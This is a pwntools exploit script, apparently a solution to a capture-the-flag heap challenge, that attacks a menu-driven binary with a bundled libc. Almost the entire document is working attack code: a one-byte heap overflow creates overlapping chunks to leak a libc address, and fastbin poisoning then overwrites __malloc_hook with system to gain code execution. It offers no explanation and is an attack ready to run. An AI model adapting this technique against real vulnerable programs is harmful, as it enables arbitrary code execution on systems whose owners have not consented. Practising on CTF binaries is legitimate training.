#!/usr/bin/env python3
from pwn import *


exe = './chall'
libc = ELF("./libc.so.6")
context.binary = elf = ELF(exe)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
# b *0x555555400DCC
continue
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def allocate(size):
    ru(b"Command: ")
    sl(b"1")
    ru(b"Size: ")
    sl(str(size).encode())
    ru(b"Index ")
    return int(ru(b"\n"))

def fill(ind, size, cont):
    ru(b"Command: ")
    sl(b"2")
    ru(b"Index: ")
    sl(str(ind).encode())
    ru(b"Size: ")
    sl(str(size).encode())
    ru(b"Content: ")
    s(cont)

def free(ind):
    ru(b"Command: ")
    sl(b"3")
    ru(b"Index: ")
    sl(str(ind).encode())

def dump(ind):
    ru(b"Command: ")
    sl(b"4")
    ru(b"Index: ")
    sl(str(ind).encode())
    ru(b"Content: \n")
    return rl()

r = start()

# Libc leak
a = allocate(0x128)
b = allocate(0x118)
c = allocate(0x118)
allocate(24)
pause()
free(a)
pause()
fill(b, 0x118+1, b"\x00"*(0x110) + p64(0x250) + b"\x20")
pause()
free(c)
pause()
allocate(0x128)
malloc_hook = u64(dump(b)[:6].ljust(8, b"\x00")) -104
libc.address = malloc_hook - 3951376

onegadget = libc.address + 0x4526a

log.info(f"{hex(libc.address)}")
log.info(f"{hex(malloc_hook)}")

# Write to a fake chunk near free hook
faky = malloc_hook-35

a = allocate(0x68)
b = allocate(0x68)
c = allocate(0x68)

free(c)
free(b)
fill(a, 0x68+8+8, b"\x00"*0x68 + p64(0x71) + p64(faky))

allocate(0x68)
inlib = allocate(0x68)
fill(inlib, 19+8, b"\x00"*19 + p64(libc.sym.system))
# pause()
sl(b"1")
sl(b"24")

r.interactive()
